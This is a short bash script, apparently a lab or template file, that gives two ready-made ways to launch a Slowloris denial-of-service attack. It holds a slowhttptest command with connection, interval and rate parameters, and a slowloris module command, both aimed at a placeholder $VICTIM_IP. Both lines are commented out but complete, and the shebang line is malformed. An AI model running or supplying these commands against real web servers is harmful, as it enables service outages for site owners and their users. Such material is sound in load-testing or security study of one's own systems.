#/bin/bash
# Two options for slowloris attack
# 1) use slowhttptest utility
# 2) use slowloris python module (https://github.com/gkbrk/slowloris)


#slowhttptest -c $number_of_connections -H -i $interval_between_messages -l $LOOPS \
#         -r $connections_per_second -t GET -u "http://$VICTIM_IP" -x $length_of_data

# slowloris -p $port $VICTIM_IP
